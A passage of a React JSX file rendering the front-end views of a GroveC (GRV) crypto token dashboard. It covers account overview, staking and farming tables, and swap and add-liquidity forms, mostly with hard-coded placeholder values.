									<h1 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2 mb-6 sm:mb-8">
										Your Overview <span className="text-2xl sm:text-[32px]">▦</span>
									</h1>
									{/* Row with Account Balance and Coin Info - Responsive */}
									<div className="flex flex-col lg:flex-row gap-8 sm:gap-12 lg:gap-16">
										<div>
											<div className="text-gray-300 text-lg mb-2">
												Account Balance
											</div>
											<div className="flex items-center gap-2 text-3xl font-bold">
												0
												<span className="bg-[#1f994f] text-white px-2 py-1 rounded ml-2 text-base font-semibold">
													GRV
												</span>
											</div>
											<div className="text-gray-400 mt-1">$0.009</div>
										</div>
										<div>
											<div className="text-gray-300 text-lg mb-2">
												Coin Info
											</div>
											<div className="flex items-center gap-2 text-2xl font-bold">
												GroveC
												<span className="bg-[#1f994f] text-white px-2 py-1 rounded ml-2 text-base font-semibold">
													GRV
												</span>
											</div>
											<div className="text-gray-400 mt-1">Decimal: 8</div>
										</div>
									</div>
								</div>
							</section>

							{/* GRV Price and Circulation Section */}
							<div className="flex flex-row gap-155 mb-2 px-4 text-[14px] text-[#686e80]">
								<h1>GRV Price</h1>
								<h1>BSC Circulation</h1>
							</div>
							<section className="flex flex-col md:flex-row gap-8 mb-8">
								{/* Left: GRV Price Chart */}
								<div className="flex-1 bg-[#020827] rounded-xl p-6  flex flex-col justify-between -ml-6">
									<div>
										<div className="text-[#7b7f92] text-lg mb-2">
											GRV / USD
										</div>
										<div className="flex items-center gap-2 text-2xl font-bold">
											$0.009{' '}
											<span className="bg-red-600 text-white px-2 py-1 rounded ml-2 text-base font-semibold">
												-0.0013
											</span>
											<span className="text-xs text-gray-400 ml-2 mr-12">
												12.62000%
											</span>
											<div className="flex gap-7 mt-2">
												{['5Min', '1H', '1D', '1M'].map((range) => (
													<button
														key={range}
														className={`bg-transparent px-5 py-1 rounded-[8px] text-[15px] transition-colors ${
															chartRange === range
																? 'text-primary bg-white text-[black] border border-primary'
																: 'text-white'
														}`}
														onClick={() => setChartRange(range)}
													>
														{range}
													</button>
												))}
											</div>
										</div>
										<div className="text-gray-400 mt-3 mb-6 text-[14px]">
											{new Date().toLocaleString()}
										</div>
									</div>
									{/* Chart Placeholder with Y-axis numbers */}
									<div className="flex-1 flex flex-row justify-end mt-4 relative">
										{/* Y-axis numbers */}

										<div className="h-120 w-full bg-gradient-to-b from-primary/30 to-transparent rounded-lg flex items-end relative overflow-hidden">
											<img
												src={chartImages[chartRange]}
												alt={`GRV/USD Chart ${chartRange}`}
												className="absolute inset-0 w-full h-120 object-fit"
											/>
										</div>
									</div>
									<button
										className="mt-6 w-full border border-primary text-primary font-semibold py-3 rounded-lg flex items-center justify-center gap-2 bg-transparent hover:bg-primary/10 transition"
										onClick={() => setActiveNav('Swap')}
									>
										<span className="bg-gradient-to-r from-green-400 to-primary rounded-full w-6 h-6 flex items-center justify-center">
											<img
												src="/src/assets/logo.jpg"
												alt="Grove Logo"
												className="w-5 h-5 rounded-full object-cover"
											/>
										</span>
										Buy Grove Coin
									</button>
								</div>
								{/* Right: Circulation Charts */}
								<div className="flex flex-col gap-8 flex-1 -ml-6 -mr-6">
									<div className="bg-[#020827] rounded-xl p-2 pt-6">
										<div className="text-gray-300 text-lg mb-8 pl-8 font-bold">
											BSC / GRV
										</div>
										<hr className="text-[#23262f]" />
										<img
											src={chartImg2}
											alt="GRV/USD Chart"
											className="w-full h-58 object-contain rounded-lg"
											style={{ position: 'static' }}
										/>
									</div>
									<div className="text-[14px] text-gray-400 mt-2">
										ETH Circulation
									</div>
									<div className="bg-[#020827] rounded-xl p-2 pt-6">
										<div className="text-gray-300 text-lg mb-8 pl-8 font-bold">
											ETH / GRV
										</div>
										<hr className="text-[#23262f]" />

										<img
											src={chartImg3}
											alt="GRV/USD Chart"
											className="w-full h-58 object-contain rounded-lg"
											style={{ position: 'static' }}
										/>
									</div>
								</div>
							</section>

							{/* Staked Assets Table */}
							<div className="flex items-center justify-between mb-4">
								<div className="text-gray-400">Staked Assets</div>
								<a
									href="#"
									onClick={(e) => {
										e.preventDefault();
										setActiveNav('Staking');
									}}
									className="text-[#1f994f] text-sm flex items-center gap-1 hover:underline"
								>
									See All Staked Assets <span>↗</span>
								</a>
							</div>
							<section className="bg-[#020827] rounded-xl p-6 mb-8">
								<div className="overflow-x-auto">
									<table className="min-w-full text-left">
										<thead>
											<tr className="text-gray-400 text-xs">
												<th className="py-2 px-4">Asset</th>
												<th className="py-2 px-4">Est. APY</th>
												<th className="py-2 px-4">Total Staked</th>
												<th className="py-2 px-4">Lockup Time</th>
												<th className="py-2 px-4">My Stake</th>
												<th className="py-2 px-4">Unclaimed Earnings</th>
												<th className="py-2 px-4">Claimed Earnings</th>
												<th className="py-2 px-4"></th>
											</tr>
										</thead>
										<tbody className="text-white">
											{[
												{ asset: 'GRV', apy: '15%', logo: '🌳' },
												{ asset: 'GRV', apy: '25%', logo: '🌳' },
												{ asset: 'GRV', apy: '40%', logo: '🌳' },
												{ asset: 'GBURN', apy: '15%', logo: '🔥' },
											].map((row, i) => (
												<tr key={i} className="border-b border-[#181f3a]">
													<td className="py-3 px-4 flex items-center gap-2">
														<span className="w-7 h-7 rounded-full flex items-center justify-center bg-gradient-to-br from-green-400 to-primary">
															<img
																src="/src/assets/logo.jpg"
																alt="Grove Logo"
																className="w-5 h-5 rounded-full object-cover"
															/>
														</span>{' '}
														{row.asset}
													</td>
													<td className="py-3 px-4">
														<span className="bg-primary text-dark px-2 py-1 rounded text-xs font-semibold">
															{row.apy}
														</span>
													</td>
													<td className="py-3 px-4">0</td>
													<td className="py-3 px-4">0Day</td>
													<td className="py-3 px-4">0</td>
													<td className="py-3 px-4">0</td>
													<td className="py-3 px-4">0</td>
													<td className="py-3 px-4">
														<div className="flex gap-2">
															<button className="bg-[#181f3a] text-gray-400 px-3 py-1 rounded text-xs">
																Stake
															</button>
															<button className="bg-[#181f3a] text-gray-400 px-3 py-1 rounded text-xs">
																Withdraw
															</button>
															<button className="bg-[#181f3a] text-gray-400 px-3 py-1 rounded text-xs">
																Harvest
															</button>
															<button className="bg-[#181f3a] text-gray-400 px-3 py-1 rounded text-xs">
																Compound
															</button>
														</div>
													</td>
												</tr>
											))}
										</tbody>
									</table>
								</div>
							</section>

							{/* Swap Calculator */}
							<div className="flex items-center justify-between mb-4">
								<div className="text-gray-400">Swap Calculator</div>
								<a
									href="#"
									onClick={(e) => {
										e.preventDefault();
										setActiveNav('Swap');
									}}
									className="text-[#1e884a] text-sm flex items-center gap-1 hover:underline"
								>
									Go to GROVE Swap <span>↗</span>
								</a>
							</div>
							<section className="bg-[#020827] rounded-xl p-8 mb-8">
								<div className="flex flex-col md:flex-row gap-6">
									{/* First input with label beside */}
									<div className="flex-1 flex items-center gap-3 relative">
										<button
											type="button"
											className="flex items-center gap-2 text-white font-semibold text-lg whitespace-nowrap px-3 py-2 rounded-lg "
											onClick={() => setShowTokenDropdown1((v) => !v)}
										>
											{selectedToken1 ? (
												<>
													<img
														src={selectedToken1.icon}
														alt={selectedToken1.symbol}
														className="w-6 h-6 rounded-full"
													/>
													<span>{selectedToken1.symbol}</span>
												</>
											) : (
												<span>Select Token</span>
											)}
											<svg
												className="w-4 h-4 ml-1"
												fill="none"
												stroke="currentColor"
												strokeWidth="2"
												viewBox="0 0 24 24"
											>
												<path
													strokeLinecap="round"
													strokeLinejoin="round"
													d="M19 9l-7 7-7-7"
												/>
											</svg>
										</button>
										{showTokenDropdown1 && (
											<div className="absolute left-0 top-12 z-20 w-56 bg-[#181f3a] border border-[#232a44] rounded-lg shadow-lg py-2">
												{tokenOptions.map((token) => (
													<button
														key={token.symbol}
														className="flex items-center gap-3 w-full px-4 py-2 text-white hover:bg-[#232a44] transition"
														onClick={() => {
															setSelectedToken1(token);
															setShowTokenDropdown1(false);
														}}
													>
														<img
															src={token.icon}
															alt={token.symbol}
															className="w-6 h-6 rounded-full"
														/>
														<span className="font-bold">
															{token.symbol}
														</span>
														<span className="text-xs text-gray-400 ml-2">
															{token.name}
														</span>
													</button>
												))}
											</div>
										)}
										<input
											className="bg-[#181f3a] border border-[#232a44] outline-none text-white w-full text-2xl font-bold text-right rounded-lg px-4 py-3 focus:border-primary transition ml-2"
											placeholder="0.0"
										/>
									</div>

									{/* Second input with label beside */}
									<div className="flex-1 flex items-center gap-3 relative">
										<button
											type="button"
											className="flex items-center gap-2 text-white font-semibold text-lg whitespace-nowrap px-3 py-2 rounded-lg "
											onClick={() => setShowTokenDropdown2((v) => !v)}
										>
											{selectedToken2 ? (
												<>
													<img
														src={selectedToken2.icon}
														alt={selectedToken2.symbol}
														className="w-6 h-6 rounded-full"
													/>
													<span>{selectedToken2.symbol}</span>
												</>
											) : (
												<span>Select Token</span>
											)}
											<svg
												className="w-4 h-4 ml-1"
												fill="none"
												stroke="currentColor"
												strokeWidth="2"
												viewBox="0 0 24 24"
											>
												<path
													strokeLinecap="round"
													strokeLinejoin="round"
													d="M19 9l-7 7-7-7"
												/>
											</svg>
										</button>
										{showTokenDropdown2 && (
											<div className="absolute left-0 top-12 z-20 w-56 bg-[#181f3a] border border-[#232a44] rounded-lg shadow-lg py-2">
												{tokenOptions.map((token) => (
													<button
														key={token.symbol}
														className="flex items-center gap-3 w-full px-4 py-2 text-white hover:bg-[#232a44] transition"
														onClick={() => {
															setSelectedToken2(token);
															setShowTokenDropdown2(false);
														}}
													>
														<img
															src={token.icon}
															alt={token.symbol}
															className="w-6 h-6 rounded-full"
														/>
														<span className="font-bold">
															{token.symbol}
														</span>
														<span className="text-xs text-gray-400 ml-2">
															{token.name}
														</span>
													</button>
												))}
											</div>
										)}
										<input
											className="bg-[#181f3a] border border-[#232a44] outline-none text-white w-full text-2xl font-bold text-right rounded-lg px-4 py-3 focus:border-primary transition ml-2"
											placeholder="0.0"
										/>
									</div>
								</div>
							</section>
						</>
					)}
					{activeNav === 'Staking' && (
						<>
							{/* Staking Overview Card */}
							<section className="bg-[#020827] rounded-xl p-8 mb-8">
								<div className="flex items-center gap-3 mb-6 text-2xl font-bold">
									Staking Overview <span className="text-3xl">🥇</span>
								</div>
								<div className="text-gray-400 text-lg mb-2">Earn value</div>
								<div className="flex items-end gap-2 text-5xl font-bold">
									0 <span className="text-3xl text-gray-400 mb-1">USD</span>
								</div>
							</section>

							{/* Staked Assets Table */}
							<section className="bg-[#020827] rounded-xl p-6 mb-8">
								<div className="text-gray-400 mb-4">Staked Assets</div>
								<div className="overflow-x-auto">
									<table className="min-w-full text-left">
										<thead>
											<tr className="text-gray-400 text-xs">
												<th className="py-2 px-4">Asset</th>
												<th className="py-2 px-4">Est. APY</th>
												<th className="py-2 px-4">Total Staked</th>
												<th className="py-2 px-4">Lockup Time</th>
												<th className="py-2 px-4">My Stake</th>
												<th className="py-2 px-4">Unclaimed Earnings</th>
												<th className="py-2 px-4">Claimed Earnings</th>
												<th className="py-2 px-4"></th>
											</tr>
										</thead>
										<tbody className="text-white">
											{[
												{ asset: 'GRV', apy: '15%', logo: '🌳' },
												{ asset: 'GRV', apy: '25%', logo: '🌳' },
												{ asset: 'GRV', apy: '40%', logo: '🌳' },
												{ asset: 'GBURN', apy: '15%', logo: '🔥' },
											].map((row, i) => (
												<tr key={i} className="border-b border-[#181f3a]">
													<td className="py-3 px-4 flex items-center gap-2">
														<span className="w-7 h-7 rounded-full flex items-center justify-center bg-gradient-to-br from-green-400 to-primary">
															<img
																src="/src/assets/logo.jpg"
																alt="Grove Logo"
																className="w-5 h-5 rounded-full object-cover"
															/>
														</span>{' '}
														{row.asset}
													</td>
													<td className="py-3 px-4">
														<span className="bg-primary text-dark px-2 py-1 rounded text-xs font-semibold">
															{row.apy}
														</span>
													</td>
													<td className="py-3 px-4">0</td>
													<td className="py-3 px-4">0Day</td>
													<td className="py-3 px-4">0</td>
													<td className="py-3 px-4">0</td>
													<td className="py-3 px-4">0</td>
													<td className="py-3 px-4">
														<div className="flex gap-2">
															<button className="bg-[#181f3a] text-gray-400 px-3 py-1 rounded text-xs">
																Stake
															</button>
															<button className="bg-[#181f3a] text-gray-400 px-3 py-1 rounded text-xs">
																Withdraw
															</button>
															<button className="bg-[#181f3a] text-gray-400 px-3 py-1 rounded text-xs">
																Harvest
															</button>
															<button className="bg-[#181f3a] text-gray-400 px-3 py-1 rounded text-xs">
																Compound
															</button>
														</div>
													</td>
												</tr>
											))}
										</tbody>
									</table>
								</div>
							</section>
						</>
					)}
					{activeNav === 'Farming' && (
						<>
							{/* Farming Overview Card */}
							<section className="bg-[#020827] rounded-xl p-8 mb-8 flex flex-col md:flex-row md:items-center md:justify-between">
								<div>
									<div className="flex items-center gap-3 mb-6 text-2xl font-bold">
										Farming <span className="text-3xl">🌾</span>
									</div>
									<div className="flex gap-12">
										<div>
											<div className="text-gray-400 text-lg mb-2">
												Earn value
											</div>
											<div className="flex items-end gap-2 text-4xl font-bold">
												0{' '}
												<span className="text-3xl text-gray-400 mb-1">
													USD
												</span>
											</div>
											<div className="text-gray-400 mt-1">$0</div>
										</div>
										<div>
											<div className="text-gray-400 text-lg mb-2">
												Total staked
											</div>
											<div className="flex items-end gap-2 text-4xl font-bold">
												0{' '}
												<span className="text-3xl text-gray-400 mb-1">
													USD
												</span>
											</div>
											<div className="text-gray-400 mt-1">$0</div>
										</div>
									</div>
								</div>
								<div className="flex gap-4 mt-8 md:mt-0">
									<button 
									className="bg-[#232a44] text-gray-200 px-6 py-2 rounded-full font-semibold border border-[#353b5c]"
									onClick={() => setActiveNav('Staking')}>
										Stake
									</button>
									<button 
									className="bg-[#232a44] text-gray-200 px-6 py-2 rounded-full font-semibold border border-[#353b5c]"
									onClick={() => setActiveNav('Liquidity')}>
										Withdraw
									</button>
									<button 
									className="bg-[#232a44] text-gray-200 px-6 py-2 rounded-full font-semibold border border-[#353b5c]"
									onClick={() => setActiveNav('Farming')}>
										Harvest
									</button>
								</div>
							</section>

							{/* Farm GRV LP Label */}
							<div className="text-gray-400 px-2 py-4">Farm GRV LP</div>

							{/* Farm Details Card */}
							<section className="bg-[#020827] rounded-xl p-8 mb-8">
								<div className="text-2xl font-bold mb-6">Farm Details</div>
								<div className="flex flex-col md:flex-row gap-12">
									<div className="flex-1 flex flex-col gap-6">
										<div>
											<div className="text-gray-400 text-sm mb-1">
												Earned
											</div>
											<div className="flex items-end gap-2 text-3xl font-bold">
												0{' '}
												<span className="bg-primary text-dark px-2 py-1 rounded ml-2 text-base font-semibold">
													GRV
												</span>
											</div>
										</div>
										<div>
											<div className="text-gray-400 text-sm mb-1">
												Lockup Time
											</div>
											<div className="text-2xl font-bold">0Day</div>
										</div>
										<div>
											<div className="text-gray-400 text-sm mb-1">
												My Stake
											</div>
											<div className="flex items-end gap-2 text-2xl font-bold">
												0{' '}
												<span className="bg-primary text-dark px-2 py-1 rounded ml-2 text-base font-semibold">
													GRV
												</span>
											</div>
										</div>
										<div>
											<div className="text-gray-400 text-sm mb-1">
												Release Cycle
											</div>
											<div className="text-2xl font-bold">3650Day</div>
										</div>
									</div>
									<div className="flex-1 flex flex-col gap-6">
										<div>
											<div className="text-gray-400 text-sm mb-1">
												APY
											</div>
											<div className="text-2xl font-bold flex items-center gap-2">
												Up to 20% <span className="text-base">▦</span>
											</div>
										</div>
										<div>
											<div className="text-gray-400 text-sm mb-1">
												Staked Liquidity
											</div>
											<div className="flex items-end gap-2 text-2xl font-bold">
												0{' '}
												<span className="text-2xl text-gray-400 mb-1">
													USD
												</span>
											</div>
										</div>
										<div>
											<div className="text-gray-400 text-sm mb-1">
												Unclaimed Earnings
											</div>
											<div className="flex items-end gap-2 text-2xl font-bold">
												0{' '}
												<span className="bg-primary text-dark px-2 py-1 rounded ml-2 text-base font-semibold">
													GRV
												</span>
											</div>
										</div>
										<div>
											<div className="text-gray-400 text-sm mb-1">
												Claimed Earnings
											</div>
											<div className="text-2xl font-bold">0</div>
										</div>
									</div>
								</div>
								<div className="border-t border-[#232a44] mt-8 pt-8">
									<div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
										<div className="flex flex-col gap-2">
											<div className="text-gray-400 text-sm mb-1">
												Withdrawal fee rate
											</div>
											<div className="flex items-end gap-2 text-2xl font-bold">
												0{' '}
												<span className="text-2xl text-gray-400 mb-1">
													%
												</span>
											</div>
										</div>
										<button 
										className="w-full md:w-auto flex-1 bg-green-600 hover:bg-green-500 text-white font-bold text-xl py-4 rounded-full transition-all"
										onClick={() => setActiveNav('Liquidity')}>
											Add Liquidity
										</button>
									</div>
									<div className="mt-4 text-center items-center">
										<a
											href="https://etherscan.io//address/0xDf8ef8a76C33B4F259bb72241A8697e307548C8b"
											target="_blank"
											rel="noopener noreferrer"
											className="text-gray-400 text-lg flex items-center gap-1 justify-end hover:underline"
										>
											View LP Token <span>↗</span>
										</a>
									</div>
								</div>
							</section>
						</>
					)}
					{activeNav === 'Swap' && (
						<>
							<section className="mb-4">
								<div className="text-2xl font-bold flex items-center gap-3 mb-2">
									Swap <span className="text-2xl">⇄</span>
								</div>
							</section>
							<div className="text-gray-400 px-2 py-4">Farm GRV LP</div>
							<section className="flex flex-col md:flex-row gap-8">
								{/* Left: GRV Price Chart */}
								<div className="flex-1 bg-[#020827] rounded-xl p-6  flex flex-col justify-between -ml-6">
									<div>
										<div className="text-[#7b7f92] text-lg mb-2">
											GRV / USD
										</div>
										<div className="flex items-center gap-2 text-2xl font-bold">
											$0.009{' '}
											<span className="bg-red-600 text-white px-2 py-1 rounded ml-2 text-base font-semibold">
												-0.0013
											</span>
											<span className="text-xs text-gray-400 ml-2 mr-12">
												12.62000%
											</span>
											<div className="flex gap-7 mt-2">
												{['5Min', '1H', '1D', '1M'].map((range) => (
													<button
														key={range}
														className={`bg-transparent px-5 py-1 rounded-[8px] text-[15px] transition-colors ${
															chartRange === range
																? 'text-primary bg-white text-[black] border border-primary'
																: 'text-white'
														}`}
														onClick={() => setChartRange(range)}
													>
														{range}
													</button>
												))}
											</div>
										</div>
										<div className="text-gray-400 mt-3 mb-6 text-[14px]">
											{new Date().toLocaleString()}
										</div>
									</div>
									{/* Chart Placeholder with Y-axis numbers */}
									<div className="flex-1 flex flex-row justify-end mt-4 relative">
										{/* Y-axis numbers */}

										<div className="h-120 w-full bg-gradient-to-b from-primary/30 to-transparent rounded-lg flex items-end relative overflow-hidden">
											<img
												src={chartImages[chartRange]}
												alt={`GRV/USD Chart ${chartRange}`}
												className="absolute inset-0 w-full h-120 object-fit"
											/>
										</div>
									</div>
								</div>
								{/* Right: Swap Card */}
								<div className="flex-1 bg-[#020827] rounded-xl p-8 flex flex-col gap-6">
									<div className="flex items-center gap-4 mb-4">
										<span className="text-2xl font-bold">Swap</span>
										<button
											className="text-gray-400 hover:text-primary"
											onClick={handleSwapReset}
											title="Reset"
											type="button"
										>
											<span className="text-2xl">⟳</span>
										</button>
										<button
											className="text-gray-400 hover:text-primary"
											onClick={() => setShowSettingsModal(true)}
											title="Settings"
											type="button"
										>
											<span className="text-xl">⚙️</span>
										</button>
									</div>
									<div className="flex flex-col gap-4">
										<div>
											<div className="text-gray-300 mb-1">
												Select Token <span className="ml-1">▼</span>
											</div>
											<div className="flex items-center bg-[#181f3a] rounded-lg px-4 py-3 mb-2">
												<input
													className="bg-transparent border-none outline-none text-white w-full text-lg"
													placeholder="0.0"
													value={swapInput1}
													onChange={(e) => setSwapInput1(e.target.value)}
												/>
											</div>
										</div>
										<div className="flex justify-end gap-2 mb-2">
											<button
												className="border border-[#1f994f] text-[#1f994f] rounded-full px-3 py-1 text-xs"
												onClick={() => setSwapInput1('25')}
											>
												25%
											</button>
											<button
												className="border  border-[#1f994f] text-[#1f994f] rounded-full px-3 py-1 text-xs"
												onClick={() => setSwapInput1('50')}
											>
												50%
											</button>
											<button
												className="border  border-[#1f994f] text-[#1f994f] rounded-full px-3 py-1 text-xs"
												onClick={() => setSwapInput1('75')}
											>
												75%
											</button>
											<button
												className="border  border-[#1f994f] text-[#1f994f] rounded-full px-3 py-1 text-xs"
												onClick={() => setSwapInput1('max')}
											>
												max
											</button>
										</div>
										<div className="flex items-center gap-2 mb-2">
											<span className="text-2xl text-primary">⇅</span>
											<span className="text-gray-300">
												Select Token <span className="ml-1">▼</span>
											</span>
										</div>
										<div className="flex items-center bg-[#181f3a] rounded-lg px-4 py-3 mb-2">
											<input
												className="bg-transparent border-none outline-none text-white w-full text-lg"
												placeholder="0.0"
												value={swapInput2}
												onChange={(e) => setSwapInput2(e.target.value)}
											/>
										</div>
										<div className="flex items-center justify-between mt-2">
											<span className="text-[#1e884b] text-sm">
												Slippage Tolerance
											</span>
											<span className="text-white text-sm">0.5%</span>
											<button
												className="text-gray-400 hover:text-primary ml-2"
												title="Edit slippage"
											>
												<span
													className="text-lg"
													onClick={() => setShowSettingsModal(true)}
													title="Settings"
													type="button"
												>
													✎
												</span>
											</button>
										</div>
									</div>
									<button
										className="w-full bg-[#1f994f] text-dark font-bold text-xl py-4 rounded-full mt-4 "
										onClick={() => setShowWalletModal(true)}
									>
										CONNECT WALLET
									</button>
								</div>
							</section>
						</>
					)}
					{activeNav === 'Liquidity' && (
						<section className="flex justify-center items-start min-h-[70vh]">
							<div className="w-full max-w-xl bg-[#10163a] rounded-2xl p-8 shadow-lg flex flex-col gap-6">
								<div className="flex items-center justify-between mb-4 border-b border-[#232a44] pb-4">
									<div className="flex items-center gap-2 text-3xl font-bold">
										Add Liquidity{' '}
										<span
											className="text-lg text-gray-300 cursor-pointer"
											title="Learn more"
										>
											?
										</span>
									</div>
									<div className="flex items-center gap-4">
										<button
											className="text-gray-300 hover:text-primary text-2xl"
											onClick={handleSwapReset}
											title="Reset"
											type="button"
										>
											⟳
										</button>
										<button
											className="text-gray-300 hover:text-primary text-2xl"
											onClick={() => setShowSettingsModal(true)}
											title="Settings"
											type="button"
										>
											⚙️
										</button>
									</div>
								</div>
								<div className="flex flex-col gap-6">
									{/* First Token Input */}
									<div>
										<div className="relative">
											<button
												type="button"
												className="flex items-center gap-1 text-gray-300 hover:text-primary font-medium px-2 py-1 rounded transition mb-5"
												onClick={() => setShowTokenDropdown1((v) => !v)}
											>
												{selectedToken1 ? (
													<>
														<img
															src={selectedToken1.icon}
															alt={selectedToken1.symbol}
															className="w-5 h-5 rounded-full"
														/>
														<span>{selectedToken1.symbol}</span>
													</>
												) : (
													<span>Select Token</span>
												)}
												<span className="ml-8">▼</span>
											</button>
											{showTokenDropdown1 && (
												<div className="absolute left-0 top-8 z-20 w-56 bg-[#181f3a] border border-[#232a44] rounded-lg shadow-lg py-2">
													{tokenOptions.map((token) => (
														<button
															key={token.symbol}
															className="flex items-center gap-3 w-full px-4 py-2 text-white hover:bg-[#232a44] transition"
															onClick={() => {
																setSelectedToken1(token);
																setShowTokenDropdown1(false);
															}}
														>
															<img
																src={token.icon}
																alt={token.symbol}
																className="w-6 h-6 rounded-full"
															/>
															<span className="font-bold">
																{token.symbol}
															</span>
															<span className="text-xs text-gray-400 ml-2">
																{token.name}
															</span>
														</button>
													))}
												</div>
											)}
										</div>
										<div className="flex items-center bg-[#181f3a] rounded-lg px-4 py-3 mb-2">
											<input
												className="bg-transparent border-none outline-none text-white w-full text-lg"
												placeholder="0.0"
												value={swapInput1}
												onChange={(e) => setSwapInput1(e.target.value)}
											/>
										</div>
										<div className="flex justify-end gap-2 mb-2">
											<button
												className="border border-[#1f994f] text-[#1f994f] rounded-full px-3 py-1 text-xs"
												onClick={() => setSwapInput1('25')}
											>
												25%
											</button>
											<button
												className="border border-[#1f994f] text-[#1f994f] rounded-full px-3 py-1 text-xs"
												onClick={() => setSwapInput1('50')}
											>
												50%
											</button>
											<button
												className="border border-[#1f994f] text-[#1f994f] rounded-full px-3 py-1 text-xs"
												onClick={() => setSwapInput1('75')}
											>
												75%
											</button>
											<button
												className="border border-[#1f994f] text-[#1f994f] rounded-full px-3 py-1 text-xs"
												onClick={() => setSwapInput1('100')}
											>
												max
											</button>
										</div>
									</div>
									{/* Swap Icon */}
									<div className="flex justify-center items-center">
										<span
											className="w-10 h-10 flex items-center justify-center rounded-full bg-[#10163a] border-4 border-[#0b1023] text-2xl text-white shadow-lg"
											onClick={() => {
												// Swap tokens
												const tempToken = selectedToken1;
												setSelectedToken1(selectedToken2);
												setSelectedToken2(tempToken);
												// Swap input values
												const tempInput = swapInput1;
												setSwapInput1(swapInput2);
												setSwapInput2(tempInput);
											}}
											title="Swap tokens"
										>
											⇅
										</span>
									</div>
									{/* Second Token Input */}
									<div>
										<div className="relative">
											<button
												type="button"
												className="flex items-center gap-1 text-gray-300 hover:text-primary font-medium px-2 py-1 rounded transition mb-5"
												onClick={() => setShowTokenDropdown2((v) => !v)}
											>
												{selectedToken1 ? (
													<>
														<img
															src={selectedToken2.icon}
															alt={selectedToken2.symbol}
															className="w-5 h-5 rounded-full"
														/>
														<span>{selectedToken2.symbol}</span>
													</>
												) : (
													<span>Select Token</span>
												)}
												<span className="ml-8">▼</span>
											</button>
											{showTokenDropdown2 && (
												<div className="absolute left-0 top-8 z-20 w-56 bg-[#181f3a] border border-[#232a44] rounded-lg shadow-lg py-2">
													{tokenOptions.map((token) => (
														<button
															key={token.symbol}
															className="flex items-center gap-3 w-full px-4 py-2 text-white hover:bg-[#232a44] transition"
															onClick={() => {
																setSelectedToken2(token);
																setShowTokenDropdown2(false);
															}}
														>
															<img
																src={token.icon}
																alt={token.symbol}
																className="w-6 h-6 rounded-full"
															/>
															<span className="font-bold">
																{token.symbol}
															</span>
															<span className="text-xs text-gray-400 ml-2">
																{token.name}
															</span>
														</button>
													))}
												</div>
											)}
										</div>
										<div className="flex items-center bg-[#181f3a] rounded-lg px-4 py-3 mb-2">
											<input
												className="bg-transparent border-none outline-none text-white w-full text-lg"
												placeholder="0.0"
												value={swapInput2}
												onChange={(e) =>
													setSwapInput2(e.target.value)
												}
											/>
										</div>
									</div>
									{/* Slippage Tolerance */}
									<div className="flex items-center justify-between mt-2">
										<span className="text-[#1f994f] text-sm">
											Slippage Tolerance
										</span>
										<span className="text-white text-sm">0.5%</span>
										<button
											className="text-gray-400 hover:text-primary ml-2"
											title="Edit slippage"
										>
											<span
												className="text-lg"
												onClick={() => setShowSettingsModal(true)}
												title="Settings"
												type="button"
											>
												✎
											</span>
										</button>
									</div>
								</div>
								<div className="border-t border-[#232a44] mt-6 pt-6">
									<button
										className="w-full bg-[#1f994f] text-dark font-bold text-xl py-4 rounded-full"
										onClick={() => setShowWalletModal(true)}
									>
										CONNECT WALLET
									</button>
								</div>
							</div>
						</section>
					)}
				</main>
			</div>
		</div>
	);
}
export default App;
